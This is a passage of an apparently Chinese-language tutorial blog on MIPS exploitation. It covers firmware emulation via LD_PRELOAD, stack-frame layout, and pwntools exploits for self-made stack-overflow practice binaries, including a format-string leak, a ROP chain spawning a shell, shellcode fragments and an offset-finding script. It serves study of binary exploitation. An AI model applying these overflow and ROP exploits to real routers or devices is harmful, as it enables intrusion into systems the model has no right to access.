class="meta">#<span class="meta-keyword">define</span> MIB_IP_ADDR 170</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIB_HW_VER 0x250</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIB_CAPTCHA 0x2C1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">apmib_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// Fake it</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fork</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">apmib_get</span><span class="params">(<span class="keyword">int</span> code, <span class="keyword">int</span> *value)</span> </span>&#123;</span><br><span class="line"><span class="keyword">switch</span>(code) &#123;</span><br><span class="line"><span class="keyword">case</span> MIB_HW_VER:</span><br><span class="line">*value = <span class="number">0xF1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> MIB_IP_ADDR:</span><br><span class="line">*value = <span class="number">0x7F000001</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> MIB_CAPTCHA:</span><br><span class="line">*value = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译生成<code>apmib-ld.so</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mips-linux-gnu-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so</span><br></pre></td></tr></table></figure><p>复制至固件根文件系统，运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-mips -E LD_PRELOAD=&quot;/apmib-ld.so&quot; ./bin/boa</span><br></pre></td></tr></table></figure><h2 id="MIPS32"><a href="#MIPS32" class="headerlink" title="MIPS32"></a>MIPS32</h2><h3 id="堆栈原理"><a href="#堆栈原理" class="headerlink" title="堆栈原理"></a>堆栈原理</h3><ul><li>栈操作：没有ESP, 进入函数时需要将当前栈指针向下移动<code>n</code>比特, 该大小为<code>n</code>比特的存储空间就是此函数的<code>Stack Frame</code>的存储区域。此后，栈指针便不再移动，只能在函数返回时将栈指针加上这个偏移量恢复现场。由于不能随便移动栈指针，所以寄存器压栈和出栈时都必须指定偏移量</li><li>调用：如果函数A调用函数B, 调用者函数（函数A)会在自己的栈顶预留一部分空间来保存被调用者（函数B)的参数，我们称之为调用参数空间</li><li>参数传递方式：前4个传入参数通过<code>$a0~$a3</code>传递。有些函数的参数可能超过4个，此时多余的参数会被放入调用参数空间</li><li>返回地址：MIPS的调用指令把函数的返回地址直接存入$RA寄存器而不是堆栈中</li></ul><h3 id="函数调用的栈布局"><a href="#函数调用的栈布局" class="headerlink" title="函数调用的栈布局"></a>函数调用的栈布局</h3><ul><li>叶子函数: 不再调用其他函数的函数</li><li>非叶子函数：调用其他函数的函数</li></ul><ol><li><p>函数调用过程</p><ol><li>当执行到调用函数的指令时，函数调用指令复制当前的<code>$PC</code>寄存器的值到<code>$RA</code>寄存器，即当前<code>$RA</code>的值就是当前函数执行结束的返回地址，然后跳转到函数并执行</li><li>程序跳转到函数以后，如果函数是非叶子函数，则函数首先会把上一个函数的返回地址(<code>$RA</code>)存入堆栈</li><li>函数返回时，如果被调用函数是叶子函数，则直接使用<code>jr $ra</code>指令返回函数A, 这里的寄存器<code>$RA</code>指向返回地址。如果函数是非叶子函数，函数先从堆栈中取出保存在堆栈上的返回地址，然后将返回地址存入寄存器<code>$RA</code>, 再使用<code>jr $ra</code>指令返回调用函数</li></ol></li><li><p>函数调用参数传递</p><p><code>$a0 ~ $a3</code>传递前4个参数，其他参数通过栈传递。函数栈帧的组织如图:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211021194812565.png" alt="image-20211021194812565"></p></li></ol><p><strong>more_argument.c :</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">more_argument</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c, <span class="keyword">int</span> d, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dst[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(dst, <span class="string">&quot;%d%d%d%d%d\n&quot;</span>, a, b, c, d, e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> c = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> d = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> e = <span class="number">1</span>;</span><br><span class="line">    more_argument(a, b, c, d, e);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数的汇编代码如下, 前4个参数往<code>$a0~$a3</code>传递，第5个参数往栈传输</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211021202457948.png" alt="image-20211021202457948"></p><h3 id="栈溢出可行性"><a href="#栈溢出可行性" class="headerlink" title="栈溢出可行性"></a>栈溢出可行性</h3><ol><li>非叶子函数：有缓冲区溢出漏洞，可以覆盖某一个函数的返回值</li><li>叶子函数：可以溢出大量数据的情况，就存在通过覆盖父函数中的返回地址利用缓冲区溢出漏洞的可能性</li></ol><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><ul><li>自己给自己出两道题玩</li><li>均为<code>ret2text</code></li></ul><h3 id="非叶子函数"><a href="#非叶子函数" class="headerlink" title="非叶子函数"></a>非叶子函数</h3><p><strong>源码</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mips-linux-gnu-gcc -fno-stack-protector mips_overflow.c -o mips_overflow</span><br></pre></td></tr></table></figure><p>32位 大端序</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     mips-32-big</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>直接溢出到返回地址就可以了，跟x86一样</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;big&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;qemu-mips&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/mips-linux-gnu&#x27;</span>, <span class="string">&#x27;./mips_overflow&#x27;</span>])</span><br><span class="line">get_shell_addr = <span class="number">0x004007A0</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">16</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> + p32(get_shell_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your name:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="叶子函数"><a href="#叶子函数" class="headerlink" title="叶子函数"></a>叶子函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> _buf[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        _buf[i] = buf[i];</span><br><span class="line">    &#125; <span class="comment">// 栈溢出漏洞</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (buf[i] == <span class="string">&#x27;n&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    check();</span><br><span class="line">    <span class="built_in">printf</span>(buf); <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mipsel-linux-gnu-gcc -fno-stack-protector mips_overflow2.c -o mips_overflow2</span><br></pre></td></tr></table></figure><p>32 位小端序</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     mips-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><p>这个比较复杂，因为要覆盖到main的返回地址且<code>$fp</code>也在栈上，不能被覆盖，所以需要先泄露一下栈的地址，由于没法直接泄露<code>$fp</code>所以从栈上找一个栈的地址，通过格式化字符串漏洞泄露出来，然后算偏移即可</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211022202807931.png" alt="image-20211022202807931"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">p = process([<span class="string">&#x27;qemu-mipsel&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>, <span class="string">&#x27;./mips_overflow2&#x27;</span>])</span><br><span class="line">p.send(<span class="string">b&quot;%9$p&quot;</span>)</span><br><span class="line">fp = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>) - <span class="number">0xf4</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(fp))</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">get_shell_addr = <span class="number">0x00400780</span></span><br><span class="line">p = process([<span class="string">&#x27;qemu-mipsel&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>, <span class="string">&#x27;./mips_overflow2&#x27;</span>])</span><br><span class="line">p.send(<span class="string">b&quot;1&quot;</span> * <span class="number">0x18</span> + p32(fp) + <span class="string">b&quot;0&quot;</span> * <span class="number">0x1c</span> + p32(get_shell_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">li t7, -3</span><br><span class="line">nor a0, t7, zero</span><br><span class="line">nor a1, t7, zero</span><br><span class="line">slti a2, zero, -1</span><br><span class="line">li v0, 4183 ( sys_socket )</span><br><span class="line">syscall 0x40404</span><br><span class="line"></span><br><span class="line">sw v0, -1(sp)</span><br></pre></td></tr></table></figure><h3 id="NOP-Sled"><a href="#NOP-Sled" class="headerlink" title="NOP Sled"></a>NOP Sled</h3><ul><li>MIPS中, NOP指令的机器码是0x00000000, 如果使用NOP实现跳转缓冲，会影响以0x00截断的字符串复制函数，如 strcpy 函数</li><li>实际上，宏观的NOP指令可以被认为，一切不影响Shellcode执行的命令都可以作为NOP指令在组织缓冲区进行填充<ul><li>例如，<code>$a2</code>的值不会影响Shellcode的执行，因此如<code>lui $a2, 0x0202</code>的机器码<code>0x3C060202</code>可以用于填充</li></ul></li></ul><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><blockquote><p>这里给的<code>vuln_system.c</code>与<code>vuln_system</code>不是同一个代码</p><p>这里以所给的<code>vuln_system</code>为例,  因此EXP与书中代码略有差距</p></blockquote><p><strong>vuln_system</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025215812508.png" alt="image-20211025215812508"></p><p><strong>checksec vuln_system</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     mips-32-big</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>攻击思路: 通过溢出构造ROP链，向<code>$a1</code>中传入<code>sh</code>, 跳到<code>do_system</code>函数进行<code>getshell</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211023202154982.png" alt="image-20211023202154982"></p><p>溢出大小<code>4 - -0x104 = 0x108</code></p><p>通过<code>IDA插件mipsrop</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">Python&gt;</span><span class="bash">mipsrop.stackfinders()</span></span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x00401D40  |  addiu $a1,$sp,0x54+var_3C                           |  jr    0x54+var_s0($sp)                |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 1 matching gadgets</span><br></pre></td></tr></table></figure><p>搜索到一条指令</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211023200326635.png" alt="image-20211023200326635"></p><p>从代码中可以看到只要在<code>$sp + 24</code>中写入<code>sh</code>,<code>$a1</code>便可指向命令字符串，在<code>jr $ra</code>命令返回时，同样在<code>$sp + 84</code>处让流程跳转到<code>do_system_0</code>函数即可</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211023200612220.png" alt="image-20211023200612220"></p><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;big&quot;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&quot;sh&quot;</span>.ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">a1_addr = <span class="number">0x00401D40</span></span><br><span class="line">do_system_addr = <span class="number">0x00400554</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;A&quot;</span> * <span class="number">0x108</span></span><br><span class="line">shellcode += p32(a1_addr)</span><br><span class="line">shellcode += <span class="string">b&quot;B&quot;</span> * <span class="number">24</span></span><br><span class="line">shellcode += cmd</span><br><span class="line">shellcode += <span class="string">b&quot;C&quot;</span> * (<span class="number">0x3C</span> - <span class="built_in">len</span>(cmd))</span><br><span class="line">shellcode += p32(do_system_addr)</span><br><span class="line">shellcode += <span class="string">b&quot;DDDD&quot;</span></span><br><span class="line"></span><br><span class="line">fw = <span class="built_in">open</span>(<span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">fw.write(shellcode)</span><br><span class="line">fw.close()</span><br></pre></td></tr></table></figure><p><strong>getshell</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211023203132896.png" alt="image-20211023203132896"></p><h2 id="IDA-mipsrop"><a href="#IDA-mipsrop" class="headerlink" title="IDA mipsrop"></a>IDA mipsrop</h2><p><a href="https://github.com/tacnetsol/ida/tree/master/plugins/mipsrop">ida/plugins/mipsrop at master · tacnetsol/ida (github.com)</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>放<code>plugin</code>目录下即可</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><code>Search =&gt; mips rop gadgets</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211022221658923.png" alt="image-20211022221658923"></p><p>接着便可以在下方输入框中进行各项输入, 输入<code>mipsrop.help()</code>查看使用方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python&gt; mipsrop.<span class="built_in">help</span>()</span><br></pre></td></tr></table></figure><p>格式修改一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mipsrop.find(instruction_string)</span><br><span class="line">        Locates all potential ROP gadgets that contain the specified</span><br><span class="line">        instruction.</span><br><span class="line"></span><br><span class="line">        @instruction_string - The instruction you need executed. This can be</span><br><span class="line">        either a:</span><br><span class="line"></span><br><span class="line">                    o Full instruction    - &quot;li $a0, 1&quot;</span><br><span class="line">                    o Partial instruction - &quot;li $a0&quot;</span><br><span class="line">                    o Regex instruction   - &quot;li $a0, .*&quot;</span><br><span class="line">mipsrop.system()</span><br><span class="line">        Prints a list of gadgets that may be used to call system().</span><br><span class="line">mipsrop.doubles()</span><br><span class="line">        Prints a list of all &quot;double jump&quot; gadgets (useful for function calls).</span><br><span class="line">mipsrop.stackfinders()</span><br><span class="line">        Prints a list of all gadgets that put a stack address into a register.</span><br><span class="line">mipsrop.tails()</span><br><span class="line">        Prints a lits of all tail call gadgets (useful for function calls).</span><br><span class="line">mipsrop.set_base()</span><br><span class="line">        Set base address used for display</span><br><span class="line">mipsrop.summary()</span><br><span class="line">        Prints a summary of your currently marked ROP gadgets, in alphabetical</span><br><span class="line">        order by the marked name. To mark a location as a ROP gadget, simply</span><br><span class="line">        mark the position in IDA (Alt+M) with any name that starts with &quot;ROP&quot;.</span><br></pre></td></tr></table></figure><h2 id="确定偏移脚本-patternLocOffset-py"><a href="#确定偏移脚本-patternLocOffset-py" class="headerlink" title="确定偏移脚本 patternLocOffset.py"></a>确定偏移脚本 patternLocOffset.py</h2><ul><li>稍微修改了一下，适配python3</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#####################################################################################</span></span><br><span class="line"><span class="comment">## Create pattern strings &amp; location offset </span></span><br><span class="line"><span class="comment">## Tested against Ubuntu 12.04 &amp; Windows # #</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">## Example:</span></span><br><span class="line"><span class="comment">## C:\Users\Lenov\Desktop&gt; patterLocOffset.py -c -l 260 -f output.txt</span></span><br><span class="line"><span class="comment">### [*] Create pattern string contains 260 characters ok!</span></span><br><span class="line"><span class="comment">### [+] output to output.txt ok!</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">## C:\Users\Lenov\Desktop&gt; patternLocOffset.py -s 0x41613141 -l 260</span></span><br><span class="line"><span class="comment">### [*] Create pattern string contains 260 characters ok!</span></span><br><span class="line"><span class="comment">### [*] Exact match at offset 3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Nimdakey # 09-10-2013</span></span><br><span class="line"><span class="comment">#####################################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">a = string.ascii_uppercase</span><br><span class="line">b = string.ascii_lowercase</span><br><span class="line">c = string.digits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">count,output</span>):</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># pattern create</span></span><br><span class="line">    codeStr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Create pattern string contains %d characters&#x27;</span>%count, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    timeStart = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,count):</span><br><span class="line">        codeStr += a[i//(<span class="number">26</span>*<span class="number">10</span>)]+b[(i%(<span class="number">26</span>*<span class="number">10</span>))//<span class="number">10</span>]+c[i%(<span class="number">26</span>*<span class="number">10</span>)%<span class="number">10</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok!&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] output to %s&#x27;</span>%output, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        fw = <span class="built_in">open</span>(output,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        fw.write(codeStr)</span><br><span class="line">        fw.close() </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> codeStr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] take time: %.4f s&quot;</span>%(time.time()-timeStart))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patternMatch</span>(<span class="params">searchCode, length=<span class="number">1024</span></span>):</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># pattern search</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    pattern = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    timeStart = time.time()</span><br><span class="line">    is0xHex = re.match(<span class="string">&#x27;^0x[0-9a-fA-F]&#123;8&#125;&#x27;</span>,searchCode)</span><br><span class="line">    isHex = re.match(<span class="string">&#x27;^[0-9a-fA-F]&#123;8&#125;&#x27;</span>,searchCode)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is0xHex:</span><br><span class="line">        <span class="comment">#0x41613141</span></span><br><span class="line">        pattern = binascii.a2b_hex(searchCode[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">elif</span> isHex:</span><br><span class="line">        <span class="comment">#41613141</span></span><br><span class="line">        pattern = binascii.a2b_hex(searchCode)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] seach Pattern eg:0x41613141&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    source = generate(length, <span class="literal">None</span>).encode()</span><br><span class="line">    offset = source.find(pattern)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> offset != -<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Exact match at offset %d&quot;</span>%offset)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] No exact matches, looking for likely candidates...&quot;</span>)</span><br><span class="line">        reverse = <span class="built_in">list</span>(pattern)</span><br><span class="line">        reverse.reverse()</span><br><span class="line">        pattern = <span class="built_in">bytes</span>(reverse)</span><br><span class="line">        offset = source.find(pattern)</span><br><span class="line">        <span class="keyword">if</span> offset != -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Possible match at offset %d (adjusted another-endian)&quot;</span>%offset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] take time: %.4f s&quot;</span>%(time.time()-timeStart))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">## parse argument</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--search&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;search for pattern&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--create&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;create a pattern&#x27;</span>,\</span><br><span class="line">                        action=<span class="string">&#x27;store_true&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;output file name&#x27;</span>,\</span><br><span class="line">                        default=<span class="string">&#x27;patternShell.txt&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--length&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;length of pattern code&#x27;</span>,\</span><br><span class="line">                        <span class="built_in">type</span>=<span class="built_in">int</span>,default=<span class="number">1024</span>)</span><br><span class="line">    <span class="comment">#parser.add_argument(&#x27;-v&#x27;, dest=&#x27;verbose&#x27;, action=&#x27;store_true&#x27;)</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## save all argument</span></span><br><span class="line">    length = args.length</span><br><span class="line">    output = args.file</span><br><span class="line">    <span class="comment">#verbose = args.verbose</span></span><br><span class="line">    createCode = args.create</span><br><span class="line">   